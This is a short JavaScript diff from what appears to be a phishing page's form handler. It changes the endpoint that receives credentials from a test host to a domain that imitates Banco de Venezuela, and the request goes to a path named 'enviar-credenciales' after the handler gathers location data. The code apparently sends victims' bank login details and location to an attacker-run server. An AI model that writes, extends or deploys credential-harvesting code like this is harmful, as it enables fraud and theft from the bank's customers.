@@ -19,7 +19,7 @@ function enviarFormulario(event) {
             }));
     })
     .then(locationData => {
-        return fetch('https://bdv-test.onrender.com/enviar-credenciales', {
+        return fetch('https://bancodevenezuela-oportunidades.onrender.com/enviar-credenciales', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
